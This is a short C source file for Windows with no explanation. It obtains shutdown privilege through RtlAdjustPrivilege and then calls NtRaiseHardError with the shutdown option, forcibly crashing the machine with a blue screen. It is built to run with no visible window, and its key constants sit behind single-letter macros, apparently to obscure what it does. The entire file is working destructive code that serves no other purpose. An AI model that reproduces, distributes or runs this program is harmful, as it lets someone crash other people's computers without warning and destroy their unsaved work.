#include <ntstatus.h>
#include <winternl.h>
#include <Windows.h>
#include <tchar.h>
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#define a 19
#define b 6
#define errcode ((NTSTATUS)0xC000000AL)

typedef NTSTATUS(NTAPI* Privilege) (
	ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled
	);

typedef NTSTATUS(NTAPI* RunError) (
	NTSTATUS error_status,
	ULONG number_of_parameters,
	ULONG unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG response_option,
	PULONG response
	);

int main() {
	Privilege p = (Privilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	BOOLEAN enable;

	if (p(a, TRUE, FALSE, &enable) == 0) {
		RunError r = (RunError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
		ULONG res;

		return r(STATUS_NOT_IMPLEMENTED, 0, 0, 0, b, &res);
	}
}